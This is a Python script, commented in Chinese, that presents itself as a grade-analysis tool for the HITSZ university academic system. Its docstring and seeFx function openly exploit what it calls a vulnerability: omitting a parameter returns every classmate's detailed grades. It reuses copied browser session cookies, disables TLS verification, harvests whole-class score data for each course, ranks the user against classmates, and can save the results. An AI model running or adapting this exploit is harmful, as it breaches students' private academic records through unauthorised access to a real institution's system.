#!/usr/bin/env python3
"""HITSZ JW 成绩分布分析工具

通过 JW 教务系统 seeFx 接口漏洞获取全班成绩明细，
计算你在班级中的百分位排名和挂科率。

用法:
  1. 浏览器登录 jw.hitsz.edu.cn
  2. F12 → Application → Cookies → 复制 jw.hitsz.edu.cn 下的
     JSESSIONID 和 route 两个 cookie 值
  3. 运行:
     python3 jw_grade_analyzer.py --jsessionid <值> --route <值>
     或:
     python3 jw_grade_analyzer.py --cookie-file session-cookies.json

  可选参数:
     --pylx 1          学生类型 (1=本科, 2=研究生, 默认1)
     --fail-rate       只输出挂科率统计（不含个人信息）
     --output result.json  保存原始数据
"""

import argparse
import json
import os
import re
import statistics
import sys
import urllib.request
import urllib.error
import ssl
import http.cookiejar
from collections import defaultdict

# ── 配置 ──────────────────────────────────────────────────────────────

JW_BASE = "http://jw.hitsz.edu.cn"
UA = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

SEM_NAMES = {
    "2025-20262": "2026春季",
    "2025-20261": "2025秋季",
    "2024-20252": "2025春季",
    "2024-20251": "2024秋季",
}

SEM_ORDER = {"2025-20262": 0, "2025-20261": 1, "2024-20252": 2, "2024-20251": 3}

# ── HTTP 工具 ─────────────────────────────────────────────────────────

def make_opener(cookies_str=None, cookie_file=None):
    jar = http.cookiejar.CookieJar()
    if cookie_file and os.path.exists(cookie_file):
        with open(cookie_file) as f:
            for c in json.load(f):
                domain = c.get("domain", "").lstrip(".") or "jw.hitsz.edu.cn"
                jar.set_cookie(http.cookiejar.Cookie(
                    version=0, name=c["name"], value=c["value"],
                    port=None, port_specified=False,
                    domain=domain, domain_specified=True, domain_initial_dot=False,
                    path=c.get("path", "/"), path_specified=True,
                    secure=False, expires=None, discard=False,
                    comment=None, comment_url=None, rest={}, rfc2109=False,
                ))
    elif cookies_str:
        for pair in cookies_str.split(";"):
            pair = pair.strip()
            if "=" not in pair:
                continue
            name, value = pair.split("=", 1)
            jar.set_cookie(http.cookiejar.Cookie(
                version=0, name=name.strip(), value=value.strip(),
                port=None, port_specified=False,
                domain="jw.hitsz.edu.cn", domain_specified=True, domain_initial_dot=False,
                path="/", path_specified=True,
                secure=False, expires=None, discard=False,
                comment=None, comment_url=None, rest={}, rfc2109=False,
            ))
    return urllib.request.build_opener(
        urllib.request.HTTPCookieProcessor(jar),
        urllib.request.HTTPSHandler(context=ctx),
    )


def http_post(opener, path, data=b"", headers=None):
    url = f"{JW_BASE}{path}"
    h = {"User-Agent": UA, "X-Requested-With": "XMLHttpRequest"}
    if headers:
        h.update(headers)
    if isinstance(data, str):
        data = data.encode()
    req = urllib.request.Request(url, data=data, headers=h, method="POST")
    try:
        resp = opener.open(req, timeout=20)
        return resp.read().decode("utf-8", errors="replace")
    except urllib.error.HTTPError as e:
        body = b""
        try:
            body = e.read()
        except:
            pass
        return body.decode("utf-8", errors="replace")
    except Exception as e:
        return str(e)


def http_post_json(opener, path, payload):
    return http_post(opener, path, json.dumps(payload).encode(),
                     {"Content-Type": "application/json"})


# ── JW 接口 ───────────────────────────────────────────────────────────

def verify_session(opener):
    body = http_post(opener, "/UserManager/queryxsxx")
    try:
        d = json.loads(body)
        name = d.get("XM", "")
        stu_id = d.get("XH", "")
        if name:
            print(f"✅ 登录成功: {name} ({stu_id})")
            return d
    except:
        pass
    print("❌ Session 无效，请检查 cookie")
    sys.exit(1)


def query_grcjcx(opener, pylx="1", page_size=200):
    payload = {
        "xn": None, "xq": None, "kcmc": None,
        "cxbj": "-1", "pylx": pylx,
        "current": 1, "pageSize": page_size,
        "xscjlb": None, "sffx": None,
    }
    body = http_post_json(opener, "/cjgl/grcjcx/grcjcx", payload)
    d = json.loads(body)
    return d.get("content", {}).get("list", [])


def query_yxkc(opener, pylx="1"):
    body = http_post(opener, "/Xsxk/queryYxkc",
                     f"p_pylx={pylx}&p_xkfsdm=yixuan&p_xn=2025-2026&p_xq=2")
    try:
        d = json.loads(body)
        return d.get("yxkcList", [])
    except:
        return []


def query_seefx(opener, rwid):
    """seeFx 不带 cjid → 返回全班所有人的成绩明细（漏洞）"""
    body = http_post(opener, "/cjgl/grcjcx/seeFx", f"rwid={rwid}")
    try:
        return json.loads(body)
    except:
        return []


# ── 加权计算 ──────────────────────────────────────────────────────────

def compute_weighted_scores(seeFx_data):
    """从 seeFx 返回数据计算每个学生的加权百分制总分。

    每个分项: normalized = (DF / MF) * 100
    总分: Σ(normalized * LJFXBZ / 100)
    如果 ΣLJFXBZ ≠ 100，按总权重归一化。
    """
    # 提取分项的 MF 和 LJFXBZ（同一分项对所有学生相同）
    component_info = {}
    for item in seeFx_data:
        fxmc = item.get("FXMC", "")
        if fxmc and fxmc not in component_info:
            try:
                mf = float(item.get("MF")) if item.get("MF") else 100.0
            except (TypeError, ValueError):
                mf = 100.0
            try:
                ljfxbz = float(item.get("LJFXBZ")) if item.get("LJFXBZ") else 0.0
            except (TypeError, ValueError):
                ljfxbz = 0.0
            component_info[fxmc] = {"mf": mf, "ljfxbz": ljfxbz}

    total_weight = sum(info["ljfxbz"] for info in component_info.values())

    # 按学生聚合
    by_student = defaultdict(dict)
    for item in seeFx_data:
        xid = item.get("XSCJB_ID", "")
        fxmc = item.get("FXMC", "")
        df = item.get("DF", "")
        by_student[xid][fxmc] = df

    student_scores = {}
    for xid, comps in by_student.items():
        weighted_total = 0.0
        for fxmc, df_str in comps.items():
            info = component_info.get(fxmc, {"mf": 100.0, "ljfxbz": 0.0})
            try:
                df = float(df_str) if df_str and df_str != "None" else 0.0
            except (TypeError, ValueError):
                df = 0.0
            mf = info["mf"] if info["mf"] > 0 else 100.0
            ljfxbz = info["ljfxbz"]
            normalized = (df / mf) * 100.0
            weighted = normalized * ljfxbz / 100.0
            weighted_total += weighted

        if total_weight > 0 and total_weight != 100:
            weighted_total = weighted_total / total_weight * 100.0

        student_scores[xid] = round(weighted_total, 2)

    return student_scores, component_info


# ── 分析逻辑 ──────────────────────────────────────────────────────────

def analyze_course(name, rwid, cjid, xnxq, seeFx_data):
    student_scores, component_info = compute_weighted_scores(seeFx_data)
    n = len(student_scores)
    if n == 0:
        return None

    totals_list = list(student_scores.values())
    my_total = student_scores.get(cjid) if cjid else None

    sorted_totals = sorted(totals_list, reverse=True)
    my_rank = None
    my_pct = None
    if my_total is not None:
        my_rank = sum(1 for t in totals_list if t > my_total) + 1
        my_pct = round((1 - (my_rank - 1) / n) * 100, 1)

    # 我的分项明细
    my_components = {}
    if cjid:
        for item in seeFx_data:
            if item.get("XSCJB_ID") == cjid:
                fxmc = item.get("FXMC", "")
                df = item.get("DF", "")
                mf = item.get("MF", "")
                ljfxbz = item.get("LJFXBZ", "")
                my_components[fxmc] = {"df": df, "mf": mf, "ljfxbz": ljfxbz}

    return {
        "name": name,
        "xnxq": xnxq,
        "n_students": n,
        "my_total": my_total,
        "my_rank": my_rank,
        "my_pct": my_pct,
        "my_components": my_components,
        "component_info": component_info,
        "mean": round(statistics.mean(totals_list), 1),
        "median": round(statistics.median(totals_list), 1),
        "stdev": round(statistics.stdev(totals_list), 1) if n > 1 else 0,
        "max": round(max(totals_list), 1),
        "min": round(min(totals_list), 1),
        "sorted_totals": sorted_totals,
        "fail_count": sum(1 for t in totals_list if t < 60),
    }


# ── 输出: 个人成绩排名 ─────────────────────────────────────────────────

def print_ranking_table(results):
    ranked = sorted(results, key=lambda r: r["my_pct"] or 0, reverse=True)

    print()
    print("| # | 课程 | 学期 | 人数 | 我的分 | 排名 | 百分位 | 平均分 | 中位数 | 标准差 | 最高 | 最低 |")
    print("|--:|------|------|-----:|------:|------|------:|------:|------:|------:|----:|----:|")
    for i, r in enumerate(ranked, 1):
        n = r["n_students"]
        my_t = f'{r["my_total"]:.1f}' if r["my_total"] is not None else "?"
        my_r = f'{r["my_rank"]}/{n}' if r["my_rank"] else "?"
        pct = f'{r["my_pct"]:.1f}%' if r["my_pct"] is not None else "?"
        sem = SEM_NAMES.get(r["xnxq"], r["xnxq"])
        mean = f'{r["mean"]:.1f}' if r["mean"] is not None else "--"
        median = f'{r["median"]:.1f}' if r["median"] is not None else "--"
        stdev = f'{r["stdev"]:.1f}' if r["stdev"] is not None else "--"
        mx = f'{r["max"]:.1f}' if r["max"] is not None else "--"
        mn = f'{r["min"]:.1f}' if r["min"] is not None else "--"
        print(f'| {i} | {r["name"]} | {sem} | {n} | {my_t} | {my_r} | {pct} | {mean} | {median} | {stdev} | {mx} | {mn} |')

    pcts = [r["my_pct"] for r in ranked if r["my_pct"] is not None]
    if pcts:
        print()
        print(f"总课程数: {len(ranked)}")
        print(f"平均百分位: {statistics.mean(pcts):.1f}%")
        print(f"中位百分位: {statistics.median(pcts):.1f}%")


def print_details(results):
    by_sem = defaultdict(list)
    for r in results:
        by_sem[r["xnxq"]].append(r)

    for sem in sorted(by_sem.keys(), key=lambda x: SEM_ORDER.get(x, 9)):
        sem_name = SEM_NAMES.get(sem, sem)
        courses = sorted(by_sem[sem], key=lambda r: r["my_pct"] or 0, reverse=True)
        print(f"\n{'='*60}")
        print(f"  {sem_name} ({len(courses)}门)")
        print(f"{'='*60}")
        for r in courses:
            n = r["n_students"]
            pct = f'{r["my_pct"]:.1f}%' if r["my_pct"] else "?"
            rank = f'{r["my_rank"]}/{n}' if r["my_rank"] else "?"
            print(f'\n  {r["name"]}  (排名 {rank}, 百分位 {pct})')
            if r["my_components"]:
                for fxmc, info in sorted(r["my_components"].items()):
                    df = info["df"]
                    mf = info["mf"]
                    ljfxbz = info["ljfxbz"]
                    print(f'    {fxmc}: {df}/{mf} (占比{ljfxbz}%)')
            else:
                print(f'    (无法定位自己的成绩 — 该课不在 grcjcx 中且无 cjid)')
            mean = r["mean"] if r["mean"] is not None else "--"
            median = r["median"] if r["median"] is not None else "--"
            stdev = r["stdev"] if r["stdev"] is not None else "--"
            mx = r["max"] if r["max"] is not None else "--"
            mn = r["min"] if r["min"] is not None else "--"
            print(f'    班级: 平均{mean} 中位{median} 标准差{stdev} 最高{mx} 最低{mn}')


# ── 输出: 挂科率统计 ──────────────────────────────────────────────────

def print_fail_rate_table(results):
    has_data = sorted(
        [r for r in results if r["n_students"] > 0],
        key=lambda x: (SEM_ORDER.get(x["xnxq"], 9), x["name"]),
    )

    print()
    print("| # | 课程 | 学期 | 人数 | 挂科人数 | 挂科率 | 平均分 | 中位数 | 最高 | 最低 |")
    print("|--:|------|------|-----:|--------:|------:|------:|------:|----:|----:|")
    for i, r in enumerate(has_data, 1):
        n = r["n_students"]
        fail = r["fail_count"]
        rate = fail / n * 100
        sem = SEM_NAMES.get(r["xnxq"], r["xnxq"])
        print(f'| {i} | {r["name"]} | {sem} | {n} | {fail} | {rate:.1f}% | {r["mean"]:.1f} | {r["median"]:.1f} | {r["max"]:.1f} | {r["min"]:.1f} |')

    total_students = sum(r["n_students"] for r in has_data)
    total_fails = sum(r["fail_count"] for r in has_data)
    print()
    print(f"总课程数: {len(has_data)}")
    print(f"总成绩记录: {total_students}")
    print(f"总挂科人数: {total_fails}")
    print(f"总体挂科率: {total_fails/total_students*100:.1f}%")

    # 挂科率最高的课
    print()
    print("挂科率 Top 5:")
    top_fails = sorted(has_data, key=lambda r: r["fail_count"] / r["n_students"], reverse=True)
    for r in top_fails[:5]:
        rate = r["fail_count"] / r["n_students"] * 100
        print(f'  {r["name"]} ({SEM_NAMES.get(r["xnxq"], r["xnxq"])})  {r["fail_count"]}/{r["n_students"]} = {rate:.1f}%')


# ── 主流程 ────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(description="HITSZ JW 成绩分布分析")
    parser.add_argument("--jsessionid", help="JW JSESSIONID cookie 值")
    parser.add_argument("--route", help="JW route cookie 值")
    parser.add_argument("--cookie-file", default="session-cookies.json",
                        help="session-cookies.json 文件路径 (默认: session-cookies.json)")
    parser.add_argument("--pylx", default="1", help="学生类型 (1=本科, 2=研究生)")
    parser.add_argument("--output", default=None, help="保存原始数据到 JSON 文件")
    parser.add_argument("--fail-rate", action="store_true",
                        help="只输出挂科率统计（不含个人信息）")
    parser.add_argument("--details", action="store_true", help="打印分项明细")
    args = parser.parse_args()

    # 构建 opener
    if args.jsessionid and args.route:
        cookies = f"JSESSIONID={args.jsessionid}; route={args.route}"
        opener = make_opener(cookies_str=cookies)
    elif os.path.exists(args.cookie_file):
        opener = make_opener(cookie_file=args.cookie_file)
    else:
        print("请提供 JW cookie:")
        print("  方式1: --jsessionid <值> --route <值>")
        print("  方式2: --cookie-file session-cookies.json")
        print()
        print("获取方法:")
        print("  1. 浏览器登录 jw.hitsz.edu.cn")
        print("  2. F12 → Application → Cookies → jw.hitsz.edu.cn")
        print("  3. 复制 JSESSIONID 和 route 的值")
        sys.exit(1)

    # 验证 session
    profile = verify_session(opener)
    pylx = args.pylx

    # Step 1: 查询成绩列表
    print("\n📋 查询成绩列表...")
    grades = query_grcjcx(opener, pylx)
    print(f"  grcjcx 返回 {len(grades)} 门课")

    cjid_map = {}
    for item in grades:
        rwid = item.get("rwid", "")
        cjid = item.get("id", "")
        if rwid and cjid:
            cjid_map[rwid] = cjid

    # Step 2: 查询已选课程
    print("\n📋 查询本学期选课...")
    yxkc = query_yxkc(opener, pylx)
    if yxkc:
        print(f"  queryYxkc 返回 {len(yxkc)} 门课")

    # Step 3: 合并课程
    all_courses = {}
    for item in grades:
        rwid = item.get("rwid", "")
        if rwid and rwid not in all_courses:
            all_courses[rwid] = {
                "name": item.get("kcmc", "?"),
                "rwid": rwid,
                "cjid": item.get("id", ""),
                "xnxq": item.get("xnxq", ""),
            }
    for item in yxkc:
        rwid = item.get("rwid", "")
        if rwid and rwid not in all_courses:
            all_courses[rwid] = {
                "name": item.get("kcmc", "?"),
                "rwid": rwid,
                "cjid": "",
                "xnxq": "2025-20262",
            }

    print(f"\n📊 共 {len(all_courses)} 门课，开始拉取全班成绩明细...")

    # Step 4: 逐课调用 seeFx
    results = []
    for i, (rwid, course) in enumerate(all_courses.items()):
        seeFx_data = query_seefx(opener, rwid)
        cjid = course["cjid"] or cjid_map.get(rwid, "")
        r = analyze_course(course["name"], rwid, cjid, course["xnxq"], seeFx_data)
        if r:
            results.append(r)
        else:
            results.append({
                "name": course["name"], "xnxq": course["xnxq"],
                "n_students": 0, "my_total": None, "my_rank": None,
                "my_pct": None, "my_components": {},
                "mean": None, "median": None, "stdev": None,
                "max": None, "min": None, "sorted_totals": [],
                "fail_count": 0,
            })
        if (i + 1) % 10 == 0:
            print(f"  进度: {i+1}/{len(all_courses)}")

    print(f"  完成: {len(results)} 门课")

    # Step 5: 输出
    if args.fail_rate:
        print("\n" + "=" * 80)
        print("  挂科率统计")
        print("=" * 80)
        print_fail_rate_table(results)
    else:
        print("\n" + "=" * 80)
        print("  成绩百分位排名")
        print("=" * 80)
        print_ranking_table(results)

        if args.details:
            print("\n" + "=" * 80)
            print("  分项成绩明细")
            print("=" * 80)
            print_details(results)

    # 保存
    if args.output:
        save_data = []
        for r in results:
            save_data.append({
                "name": r["name"],
                "xnxq": r["xnxq"],
                "n_students": r["n_students"],
                "my_total": r["my_total"],
                "my_rank": r["my_rank"],
                "my_pct": r["my_pct"],
                "my_components": r.get("my_components", {}),
                "mean": r["mean"],
                "median": r["median"],
                "stdev": r["stdev"],
                "max": r["max"],
                "min": r["min"],
                "fail_count": r.get("fail_count", 0),
            })
        with open(args.output, "w", encoding="utf-8") as f:
            json.dump(save_data, f, ensure_ascii=False, indent=2)
        print(f"\n💾 原始数据已保存到 {args.output}")

    if not args.fail_rate:
        no_match = [r for r in results if r["my_pct"] is None and r["n_students"] > 0]
        if no_match:
            print(f"\n⚠️  {len(no_match)} 门课有全班数据但无法定位你的成绩:")
            for r in no_match:
                print(f"    - {r['name']} ({r['n_students']}人)")


if __name__ == "__main__":
    main()
